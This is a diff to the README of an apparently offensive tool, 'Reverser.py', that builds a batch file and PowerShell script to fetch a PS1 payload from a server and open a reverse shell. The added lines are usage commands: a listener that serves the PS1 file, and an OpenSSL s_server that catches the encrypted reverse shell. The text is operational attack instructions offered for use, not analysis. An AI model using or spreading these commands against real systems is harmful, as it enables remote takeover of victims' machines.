@@ -38,6 +38,16 @@ Generate a Batch File and PowerShell Script:
 python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type bat -server http://<Your_Server_ip|URL>/<File-Name>.ps1
 ```
 
+Open a listener for downloadingg the PS1 file with listener.py:
+```bash
+python3 listener.py -port <Your_Server_PORT>
+```
+
+Open a listener for getting Reverse-Shell with OpenSSL:
+```bash
+openssl s_server -accept <Your_Listener_Port> -cert reception.pem -key reception.key -quiet
+```
+
 ## PoC:
 Generate a Batch File and PowerShell Script:
 
